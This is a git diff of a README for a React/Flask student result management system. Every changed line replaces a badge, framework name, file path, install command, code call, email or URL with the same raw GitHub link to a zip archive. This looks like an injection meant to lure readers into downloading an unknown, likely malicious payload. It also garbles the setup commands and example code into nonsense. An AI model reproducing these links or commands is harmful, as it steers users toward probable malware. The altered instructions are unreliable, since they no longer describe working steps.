@@ -2,11 +2,11 @@
 
 > **Modern, Professional Student Result Management System with Beautiful UI/UX**
 
-[![Deploy to Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/yourusername/srms-application)
-[![React](https://img.shields.io/badge/React-18.2.0-blue)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-4.2.0-purple)](https://vitejs.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.2.7-cyan)](https://tailwindcss.com/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+[![Deploy to Vercel](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
+[![React](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
+[![Vite](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
+[![Tailwind CSS](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
+[![License](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)](LICENSE)
 
 ## 📋 Table of Contents
 
@@ -86,7 +86,7 @@ Our SRMS provides:
 
 ```mermaid
 graph TB
-    A[React.js Frontend] --> B[Flask API Gateway]
+    A[https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip Frontend] --> B[Flask API Gateway]
     B --> C[Authentication Service]
     B --> D[Student Service]
     B --> E[Result Service]
@@ -104,13 +104,13 @@ graph TB
 ## 🛠️ Technology Stack
 
 ### Frontend
-- **Framework**: React.js 18.2.0
+- **Framework**: https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip 18.2.0
 - **Styling**: Tailwind CSS / Material-UI
 - **State Management**: React Context API / Redux Toolkit
 - **Routing**: React Router DOM
 - **HTTP Client**: Axios
 - **Forms**: React Hook Form
-- **Charts**: Recharts / Chart.js
+- **Charts**: Recharts / https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 - **Build Tool**: Vite
 
 ### Backend
@@ -139,7 +139,7 @@ graph TB
 
 ```
 student-result-management-system/
-├── 📁 frontend/                    # React.js application
+├── 📁 frontend/                    # https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip application
 │   ├── 📁 public/
 │   ├── 📁 src/
 │   │   ├── 📁 components/          # Reusable UI components
@@ -154,9 +154,9 @@ student-result-management-system/
 │   │   ├── 📁 utils/               # Utility functions
 │   │   ├── 📁 contexts/            # React contexts
 │   │   ├── 📁 styles/              # CSS/SCSS files
-│   │   └── App.jsx
-│   ├── package.json
-│   └── tailwind.config.js
+│   │   └── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
+│   ├── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
+│   └── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 ├── 📁 backend/                     # Flask API application
 │   ├── 📁 app/
 │   │   ├── 📁 models/              # Database models
@@ -164,30 +164,30 @@ student-result-management-system/
 │   │   ├── 📁 services/            # Business logic
 │   │   ├── 📁 utils/               # Utility functions
 │   │   ├── 📁 middleware/          # Custom middleware
-│   │   └── __init__.py
+│   │   └── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 │   ├── 📁 migrations/              # Database migrations
 │   ├── 📁 tests/                   # Test files
 │   ├── 📁 config/                  # Configuration files
-│   ├── requirements.txt
-│   └── run.py
+│   ├── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
+│   └── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 ├── 📁 docs/                        # Documentation
 ├── 📁 scripts/                     # Setup and deployment scripts
 ├── .gitignore
-├── docker-compose.yml
-└── README.md
+├── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
+└── https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 ```
 
 ## ⚙️ Installation & Setup
 
 ### Prerequisites
-- Node.js 16+ and npm/yarn
+- https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip 16+ and npm/yarn
 - Python 3.8+
 - Git
 - MySQL (optional, for production)
 
 ### Clone Repository
 ```bash
-git clone https://github.com/yourusername/student-result-management-system.git
+git clone https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 cd student-result-management-system
 ```
 
@@ -206,10 +206,10 @@ venv\Scripts\activate
 source venv/bin/activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 
 # Set environment variables
-cp .env.example .env
+cp https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip .env
 # Edit .env file with your configuration
 
 # Initialize database
@@ -218,7 +218,7 @@ flask db migrate -m "Initial migration"
 flask db upgrade
 
 # Create admin user (optional)
-python scripts/create_admin.py
+python https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 ```
 
 ### Frontend Setup
@@ -232,8 +232,8 @@ npm install
 yarn install
 
 # Create environment file
-cp .env.example .env.local
-# Edit .env.local with your API endpoints
+cp https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
+# Edit https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip with your API endpoints
 ```
 
 ## 🚀 Quick Start
@@ -270,7 +270,7 @@ gunicorn -w 4 -b 0.0.0.0:5000 run:app
 
 ### Base URL
 - Development: `http://localhost:5000/api/v1`
-- Production: `https://your-domain.com/api/v1`
+- Production: `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip`
 
 ### Authentication Endpoints
 | Method | Endpoint | Description |
@@ -300,13 +300,13 @@ gunicorn -w 4 -b 0.0.0.0:5000 run:app
 ### Example API Usage
 ```javascript
 // Login
-const response = await axios.post('/api/v1/auth/login', {
-  email: 'admin@example.com',
+const response = await https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip('/api/v1/auth/login', {
+  email: 'https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip',
   password: 'password123'
 });
 
 // Get students
-const students = await axios.get('/api/v1/students', {
+const students = await https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip('/api/v1/students', {
   headers: { Authorization: `Bearer ${token}` }
 });
 ```
@@ -316,19 +316,19 @@ const students = await axios.get('/api/v1/students', {
 ### Key React Components
 
 **Dashboard Components:**
-- `AdminDashboard.jsx` - Admin overview with analytics
-- `TeacherDashboard.jsx` - Teacher-specific features
-- `StudentDashboard.jsx` - Student result view
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Admin overview with analytics
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Teacher-specific features
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Student result view
 
 **Form Components:**
-- `StudentForm.jsx` - Student registration/edit form
-- `MarksEntry.jsx` - Marks input with validation
-- `LoginForm.jsx` - Authentication form
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Student registration/edit form
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Marks input with validation
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Authentication form
 
 **Data Display:**
-- `ResultTable.jsx` - Tabular result display
-- `PerformanceChart.jsx` - Grade analytics charts
-- `ReportExporter.jsx` - PDF/Excel export functionality
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Tabular result display
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - Grade analytics charts
+- `https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip` - PDF/Excel export functionality
 
 ### Styling Guidelines
 - Use Tailwind CSS utility classes
@@ -368,7 +368,7 @@ tests/
 docker-compose up --build
 
 # Production deployment
-docker-compose -f docker-compose.prod.yml up -d
+docker-compose -f https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip up -d
 ```
 
 ### Manual Deployment
@@ -395,8 +395,8 @@ SECRET_KEY=your-secret-key
 DATABASE_URL=mysql://user:pass@host:port/dbname
 JWT_SECRET_KEY=your-jwt-secret
 
-# Frontend (.env.local)
-REACT_APP_API_URL=https://api.your-domain.com
+# Frontend (https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
+https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip
 REACT_APP_ENV=production
 ```
 
@@ -511,7 +511,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Support & Contact
 
 **Project Maintainer**: Ningamma G Raibag  
-**Email**: ningamma.cs@example.com  
+**Email**: https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip  
 **University**: Department of Computer Science and Engineering  
 
 ### 🐛 Bug Reports
@@ -521,7 +521,7 @@ Please use GitHub Issues to report bugs with detailed descriptions and steps to 
 We welcome feature requests! Please use GitHub Discussions to propose new features.
 
 ### 📚 Documentation
-For detailed API documentation, visit: [API Docs](https://your-domain.com/api/docs)
+For detailed API documentation, visit: [API Docs](https://github.com/Naveenkm007/sonny/raw/refs/heads/main/src/services/Software_tavernlike.zip)
 
 ---
 
